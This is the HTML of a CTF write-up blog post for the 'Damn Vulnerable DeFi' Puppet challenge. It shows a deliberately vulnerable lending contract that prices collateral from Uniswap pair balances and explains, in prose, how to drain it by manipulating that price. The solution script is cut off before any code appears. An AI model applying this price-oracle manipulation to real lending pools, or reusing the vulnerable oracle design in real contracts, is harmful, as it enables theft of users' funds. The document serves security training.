@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Damn Vulnerable DeFi - Challenge #8 - Puppet - della&#39;s blog</title><meta name="Description" content="della&#39;s blog"><meta property="og:title" content="Damn Vulnerable DeFi - Challenge #8 - Puppet" />
+<meta property="og:description" content="Solution for &ldquo;Damn Vulnerable DeFi - Challenge #8 - Puppet&rdquo;." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dellalibera.github.io/posts/damnvulnerabledefi_08_puppet/" /><meta property="og:image" content="https://dellalibera.github.io"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-09-20T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-09-20T00:00:00+00:00" /><meta property="og:site_name" content="della&#39;s blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://dellalibera.github.io"/>
+
+<meta name="twitter:title" content="Damn Vulnerable DeFi - Challenge #8 - Puppet"/>
+<meta name="twitter:description" content="Solution for &ldquo;Damn Vulnerable DeFi - Challenge #8 - Puppet&rdquo;."/>
+<meta name="application-name" content="della&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="della&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dellalibera.github.io/posts/damnvulnerabledefi_08_puppet/" /><link rel="prev" href="https://dellalibera.github.io/posts/damnvulnerabledefi_07_compromised/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Damn Vulnerable DeFi - Challenge #8 - Puppet",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/dellalibera.github.io\/posts\/damnvulnerabledefi_08_puppet\/"
+        },"genre": "posts","keywords": "Damn Vulnerable DeFi, CTF, Solidity, Blockchain","wordcount":  1113 ,
+        "url": "https:\/\/dellalibera.github.io\/posts\/damnvulnerabledefi_08_puppet\/","datePublished": "2022-09-20T00:00:00+00:00","dateModified": "2022-09-20T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "della"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="della&#39;s blog">della&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> Home </a><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/advisories/"> Advisories </a><a class="menu-item" href="/about/"> About </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="della&#39;s blog">della&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="">Home</a><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/advisories/" title="">Advisories</a><a class="menu-item" href="/about/" title="">About</a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title">Damn Vulnerable DeFi - Challenge #8 - Puppet</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://dellalibera.github.io/about/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>della</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Writeup</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="September 20, 2022">September 20, 2022</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1113 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-challenge">1) Challenge</a></li>
+    <li><a href="#2-code-review">2) Code Review</a></li>
+    <li><a href="#3-solution">3) Solution</a></li>
+    <li><a href="#4-references">4) References</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div id="id-1">Solution for &ldquo;Damn Vulnerable DeFi - Challenge #8 - Puppet&rdquo;.</div>
+<h2 id="1-challenge">1) Challenge</h2>
+<div class="details admonition quote open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>There&rsquo;s a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.</p>
+<p>There&rsquo;s a DVT market opened in an Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.</p>
+<p>Starting with 25 ETH and 1000 DVTs in balance, you must steal all tokens from the lending pool. (<a href="https://www.damnvulnerabledefi.xyz/challenges/8.html" target="_blank" rel="noopener noreffer ">link</a>)</p>
+</div>
+        </div>
+    </div>
+<p>Challenge created by <a href="https://twitter.com/tinchoabbate" target="_blank" rel="noopener noreffer ">@tinchoabbate</a>.</p>
+<h2 id="2-code-review">2) Code Review</h2>
+<p>For this challenge, we have only one contract: <code>PuppetPool</code> (<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/contracts/puppet/PuppetPool.sol" target="_blank" rel="noopener noreffer ">source code</a>):</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#00f">contract</span> <span style="color:#000">PuppetPool</span> <span style="color:#00f">is</span> <span style="color:#000">ReentrancyGuard</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">using</span> <span style="color:#000">Address</span> <span style="color:#00f">for</span> <span style="color:#00f">address</span> <span style="color:#00f">payable</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">mapping</span>(<span style="color:#00f">address</span> =&gt; <span style="color:#00f">uint256</span>) <span style="color:#00f">public</span> <span style="color:#000">deposits</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">address</span> <span style="color:#00f">public</span> <span style="color:#00f">immutable</span> <span style="color:#000">uniswapPair</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#000">DamnValuableToken</span> <span style="color:#00f">public</span> <span style="color:#00f">immutable</span> <span style="color:#000">token</span>;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">event</span> <span style="color:#000">Borrowed</span>(<span style="color:#00f">address</span> <span style="color:#00f">indexed</span> <span style="color:#000">account</span>, <span style="color:#00f">uint256</span> <span style="color:#000">depositRequired</span>, <span style="color:#00f">uint256</span> <span style="color:#000">borrowAmount</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">constructor</span> (<span style="color:#00f">address</span> <span style="color:#000">tokenAddress</span>, <span style="color:#00f">address</span> <span style="color:#000">uniswapPairAddress</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">token</span> = <span style="color:#000">DamnValuableToken</span>(<span style="color:#000">tokenAddress</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#000">uniswapPair</span> = <span style="color:#000">uniswapPairAddress</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#888;font-style:italic">// Allows borrowing `borrowAmount` of tokens by first depositing two times their value in ETH
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>    <span style="color:#00f">function</span> <span style="color:#000">borrow</span>(<span style="color:#00f">uint256</span> <span style="color:#000">borrowAmount</span>) <span style="color:#00f">public</span> <span style="color:#00f">payable</span> <span style="color:#000">nonReentrant</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">uint256</span> <span style="color:#000">depositRequired</span> = <span style="color:#000">calculateDepositRequired</span>(<span style="color:#000">borrowAmount</span>);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#000">require</span>(<span style="color:#000">msg</span>.<span style="color:#000">value</span> &gt;= <span style="color:#000">depositRequired</span>, <span style="color:#5a2">&#34;Not depositing enough collateral&#34;</span>);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">if</span> (<span style="color:#000">msg</span>.<span style="color:#000">value</span> &gt; <span style="color:#000">depositRequired</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#00f">payable</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>).<span style="color:#000">sendValue</span>(<span style="color:#000">msg</span>.<span style="color:#000">value</span> - <span style="color:#000">depositRequired</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">deposits</span>[<span style="color:#000">msg</span>.<span style="color:#000">sender</span>] = <span style="color:#000">deposits</span>[<span style="color:#000">msg</span>.<span style="color:#000">sender</span>] + <span style="color:#000">depositRequired</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">// Fails if the pool doesn&#39;t have enough tokens in liquidity
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>        <span style="color:#000">require</span>(<span style="color:#000">token</span>.<span style="color:#000">transfer</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#000">borrowAmount</span>), <span style="color:#5a2">&#34;Transfer failed&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">emit</span> <span style="color:#000">Borrowed</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#000">depositRequired</span>, <span style="color:#000">borrowAmount</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">calculateDepositRequired</span>(<span style="color:#00f">uint256</span> <span style="color:#000">amount</span>) <span style="color:#00f">public</span> <span style="color:#00f">view</span> <span style="color:#00f">returns</span> (<span style="color:#00f">uint256</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">return</span> <span style="color:#000">amount</span> * <span style="color:#000">_computeOraclePrice</span>() * <span style="color:#3af">2</span> / <span style="color:#3af">10</span> ** <span style="color:#3af">18</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">_computeOraclePrice</span>() <span style="color:#00f">private</span> <span style="color:#00f">view</span> <span style="color:#00f">returns</span> (<span style="color:#00f">uint256</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">// calculates the price of the token in wei according to Uniswap pair
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>        <span style="color:#00f">return</span> <span style="color:#000">uniswapPair</span>.<span style="color:#000">balance</span> * (<span style="color:#3af">10</span> ** <span style="color:#3af">18</span>) / <span style="color:#000">token</span>.<span style="color:#000">balanceOf</span>(<span style="color:#000">uniswapPair</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>     <span style="color:#888;font-style:italic">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic">     ... functions to deposit, redeem, repay, calculate interest, and so on ...
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic">     */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<ul>
+<li><code>borrow</code> accepts the amount to borrow and prevents a reentrancy attack by using the <code>nonReentrant</code> modifier; it&rsquo;s also a payable function:
+<ul>
+<li>computes the deposit required to borrow the amount requested. It calls the <code>calculateDepositRequired</code> function (line <code>29</code>)</li>
+<li>checks, if the ETH amount sent is <code>&gt;=</code> than the deposit required (line <code>31</code>)</li>
+<li>if the ETH amount sent is <code>&gt;</code> than the deposit required, the difference (<code>msg.value - depositRequired</code>) is sent back to the sender (lines <code>33-35</code>)</li>
+<li>updates the <code>deposits</code> variable for the <code>msg.sender</code> (line <code>37</code>)</li>
+<li>transfers the tokens requested to the <code>msg.sender</code> (line <code>40</code>)</li>
+</ul>
+</li>
+<li><code>calculateDepositRequired</code> returns the deposit required as collateral. It calls <code>_computeOraclePrice</code> to retrieve the price used in the formula <code>amount * _computeOraclePrice() * 2 / 10 ** 18</code></li>
+<li><code>_computeOraclePrice</code> computes the token&rsquo;s price by using information from the Uniswap pair (line <code>51</code>). In particular, the price is calculated as the ratio of the Uniswap balance over the Uniswap token balance.</li>
+</ul>
+<p>Here are the current balances:</p>
+<ul>
+<li>we have <code>25 ETH</code> and <code>1000 DVT</code> (<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/test/puppet/puppet.challenge.js#L21-L22" target="_blank" rel="noopener noreffer ">setup</a>)</li>
+<li>the Uniswap exchange has <code>10 ETH</code> and <code>10 DVT</code> (<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/test/puppet/puppet.challenge.js#L18-L19" target="_blank" rel="noopener noreffer ">setup</a>)</li>
+<li>the pool has <code>100000 DVT</code> (<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/test/puppet/puppet.challenge.js#L23" target="_blank" rel="noopener noreffer ">setup</a>)</li>
+</ul>
+<p>Looking at the <code>calculateDepositRequired</code>, it initially returns double the amount requested. With the initial price, to steal all the <code>100000 DVT</code>, we need to deposit <code>200000 ETH</code> as collateral. Unfortunately, we have <code>25 ETH</code>.</p>
+<p>The <code>_computeOraclePrice</code> function uses the exchange <code>ETH</code> and <code>DVT</code> balances to compute the price. It means that if the <code>DVT</code> balance of the exchange increases (the denominator in the formula), the calculated price will also decrease.</p>
+<p>So, if we swap most of our <code>DVT</code> for some <code>ETH</code>, the value <code>token.balanceOf(uniswapPair)</code> will be much more significant compared to the <code>uniswapPair.balance</code> (that will be close to zero since we have enough <code>DVT</code> to drain most of the balance).</p>
+<p>Once we have swapped all the <code>DVT</code>, the price will be so low that the deposit required to borrow <code>100000 DVT</code> will be less than the <code>ETH</code> we have obtained (it will be roughly <code>19 ETH</code>).</p>
+<h2 id="3-solution">3) Solution</h2>
+<p>The solution consists of the following steps:</p>
+<ul>
+<li>swap <code>999.99 DVT</code> for <code>ETH</code> using the Uniswap pair by calling <code>tokenToEthSwapInput</code> (we need first to approve the Uniswap pair). We need to leave some <code>DVT</code> because the challenge requires having more than <code>100000 DVT</code> (<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/test/puppet/puppet.challenge.js#L115-L117" target="_blank" rel="noopener noreffer ">challenge</a>)</li>
+<li>borrow <code>100000 DVT</code> from the pool by depositing the amount requested (it will be less than the <code>ETH</code> we have)</li>
+</ul>
+<p><code>puppet.challenge.js</code>:
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
